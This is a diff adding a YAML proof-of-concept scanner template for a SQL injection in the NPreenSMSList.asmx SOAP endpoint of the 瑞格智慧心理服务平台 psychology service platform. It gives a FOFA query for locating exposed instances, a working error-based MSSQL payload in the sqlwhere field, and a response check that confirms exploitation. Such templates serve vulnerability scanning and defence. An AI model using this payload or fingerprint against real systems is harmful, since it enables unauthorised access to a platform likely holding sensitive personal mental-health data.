@@ -1,0 +1,36 @@
+id: poc-yaml-rgpsy-npreensmslist-asmx-sqli
+info:
+  name: 瑞格智慧心理服务平台 NPreenSMSList.asmx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 瑞格智慧心理服务平台
+  fofa: body="瑞格智慧心理服务平台"
+variables:
+  t1: random_int(100,1000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /NPreenManage/NPreenSMSList.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: RuiGe.WebUi.NPreenSMS/Seach
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <Seach xmlns="RuiGe.WebUi.NPreenSMS">
+
+    <sqlwhere>and 1=convert(int,sys.fn_varbintohexstr(hashbytes(''MD5'',''{{.t1}}'')))</sqlwhere>
+
+    </Seach>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: status_code == 500 && contains(body,"在将 nvarchar 值") && contains(body,"0x"
+    + t2) && contains(body,"转换成数据类型 int 时失败") && contains(content_type,"text/xml")
+transport: http
